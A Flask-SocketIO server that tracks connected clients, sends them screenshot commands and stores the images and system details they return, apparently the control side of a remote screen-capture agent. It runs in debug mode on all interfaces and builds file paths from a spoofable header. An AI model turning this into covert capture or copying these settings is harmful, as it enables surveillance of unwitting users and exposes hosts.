import base64
import os
from datetime import datetime

from flask import Flask, request, jsonify, send_from_directory
from flask_migrate import Migrate
from flask_socketio import SocketIO

from config.config import Config
from config.extensions import db

app = Flask(__name__)
app.config.from_object(Config)
db.init_app(app)
migrate = Migrate(app, db)

# Models
from models import Client, Screenshot

socketio = SocketIO(app)
clients = {}


@app.route('/api/v1/command/<int:client_id>', methods=['POST'])
def handle_command(client_id):
    command_data = request.get_json()
    command = command_data.get('command')

    if command == 'screenshot':
        return emit_command_to_client(client_id, command)
    return jsonify({'status': 'error', 'message': 'Commande non reconnue.'}), 400


def emit_command_to_client(client_id, command):
    client = Client.query.get(client_id)
    if client and client.status == 'online':
        socketio.emit('command', {'command': command}, room=client.sid)
        return jsonify({'status': 'success', 'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}), 200
    elif client and client.status == 'offline':
        return jsonify({'status': 'error', 'message': f'**🔴 Client {client_id} hors ligne.'}), 400
    else:
        return jsonify({'status': 'error', 'message': 'Client non trouvé.'}), 404


@app.route('/api/v1/clients', methods=['GET'])
def get_clients():
    status_filter = request.args.get('status')
    if status_filter:
        clients = Client.query.filter_by(status=status_filter).all()
    else:
        clients = Client.query.all()

    clients_info = [
        {
            'id': client.id,
            'name': f'Client {client.id}',
            'ip': client.ip,
            'os': client.os,
            'version': client.os_version,
            'hostname': client.hostname,
            'status': client.status,
            'date_created': client.date_created.strftime('%d/%m/%Y à %H:%M:%S'),
            'date_updated': client.date_updated.strftime('%d/%m/%Y à %H:%M:%S')
         }
        for client in clients]
    return jsonify({'status': 'success', 'clients': clients_info}), 200


def list_screenshots(directory):
    if os.path.exists(directory):
        return [f"{directory}/{file}" for file in os.listdir(directory) if
                os.path.isfile(os.path.join(directory, file))]
    return []


@app.route('/api/v1/screenshot/client/<int:client_id>', methods=['GET'])
def get_screenshots_by_client_id(client_id):
    screenshots = Screenshot.query.filter_by(client_id=client_id).all()
    screenshots_info = [{
        'id': screenshot.id,
        'file_path': screenshot.file_path,
        'date_created': screenshot.date_created.strftime('%d/%m/%Y à %H:%M:%S')
    } for screenshot in screenshots]
    return jsonify({'status': 'success', 'screenshots': screenshots_info}), 200


@app.route('/api/v1/screenshot/image/<int:screenshot_id>', methods=['GET'])
def get_screenshot_image(screenshot_id):
    screenshot = Screenshot.query.get(screenshot_id)
    if screenshot and os.path.exists(screenshot.file_path):
        return send_from_directory(os.path.dirname(screenshot.file_path), os.path.basename(screenshot.file_path))
    else:
        return jsonify({'status': 'error', 'message': 'Capture d\'écran non trouvée.'}), 404


@socketio.on('connect')
def handle_connect():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    sid = request.sid
    client = Client.query.filter_by(ip=client_ip).first()
    if client:
        client.status = 'online'
        client.sid = sid
        client.date_updated = datetime.now()
    else:
        client = Client(ip=client_ip, status='online', sid=sid, date_created=datetime.now())
        db.session.add(client)
    db.session.commit()
    print(f"Client {client_ip} en ligne.")


@socketio.on('system_info')
def handle_system_info(data):
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client.os = data.get('os')
        client.os_version = data.get('os_version')
        client.hostname = data.get('hostname')
        db.session.commit()
    else:
        print("Client non trouvé.")


@socketio.on('screenshot_response')
def handle_screenshot(data):
    screenshot_bytes = base64.b64decode(data.get('screenshot'))
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client_ip = client.ip
        screenshot_dir = f"screenshots/{client_ip}"
        os.makedirs(screenshot_dir, exist_ok=True)
        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
        screenshot_path = f"{screenshot_dir}/{file_name}"
        with open(screenshot_path, 'wb') as f:
            f.write(screenshot_bytes)

        new_screenshot = Screenshot(client_id=client.id, file_path=screenshot_path)
        db.session.add(new_screenshot)
        db.session.commit()
    else:
        print("Client non trouvé.")


@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    client = Client.query.filter_by(sid=sid).first()
    if client:
        client.status = 'offline'
        client.date_updated = datetime.now()
        db.session.commit()
    print(f"Client {client.ip} hors ligne.")


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
